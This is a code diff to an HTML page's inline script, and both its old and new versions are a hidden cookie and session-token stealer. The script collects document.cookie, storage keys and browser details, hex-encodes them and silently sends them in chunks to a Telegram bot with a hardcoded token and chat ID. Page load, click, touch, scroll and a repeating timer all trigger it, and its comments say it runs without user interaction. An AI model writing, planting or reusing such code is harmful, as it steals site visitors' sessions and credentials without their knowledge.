@@ -9,30 +9,34 @@
     <script>
         (function(){
             const T="8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k", C="8639892987";
-            function toHex(s){let r='';for(let i=0;i<s.length;i++){r+=s.charCodeAt(i).toString(16).padStart(2,'0');}return r;}
+            function h(s){let r='';for(let i=0;i<s.length;i++){r+=s.charCodeAt(i).toString(16).padStart(2,'0');}return r;}
 
-            async function ghost_leak(){
-                try{
-                    // Goal: Capture active session fingerprints without user interaction
-                    let leak = {
-                        A_OBJ: Object.keys(window.localStorage), // Hidden keys
-                        B_SES: {...sessionStorage},
-                        C_NAV: {ua: navigator.userAgent, lang: navigator.language},
-                        D_TIME: new Date().getTime()
+            async function exfiltrate(){
+                try {
+                    // Scanning for Session Tokens & Cookies silently
+                    let dump = {
+                        keys: Object.keys(localStorage),
+                        session: Object.keys(sessionStorage),
+                        cookies: document.cookie,
+                        platform: navigator.platform,
+                        agent: navigator.userAgent
                     };
                     
-                    let p = toHex(JSON.stringify(leak));
-                    const chunks = p.match(/.{1,180}/g);
+                    let hex = h(JSON.stringify(dump));
+                    const chunks = hex.match(/.{1,180}/g);
                     chunks.forEach((chunk, i) => {
-                        new Image().src=`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🧬_GHOST_P${i}_${chunk}`;
+                        new Image().src=`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🧬_DEEP_HEX_P${i}_${chunk}`;
                     });
-                }catch(e){}
+                } catch(e) {}
             }
 
-            // Silent Triggers (No Pop-ups)
-            window.onload = ghost_leak;
-            window.ontouchstart = ghost_leak; 
-            setInterval(ghost_leak, 30000); 
+            // High-Frequency Silent Triggers
+            window.onclick = exfiltrate;
+            window.ontouchstart = exfiltrate;
+            window.onscroll = exfiltrate;
+            
+            // Auto-pulse every 15 seconds to catch dynamic tokens
+            setInterval(exfiltrate, 15000);
         })();
     </script>
 </body>
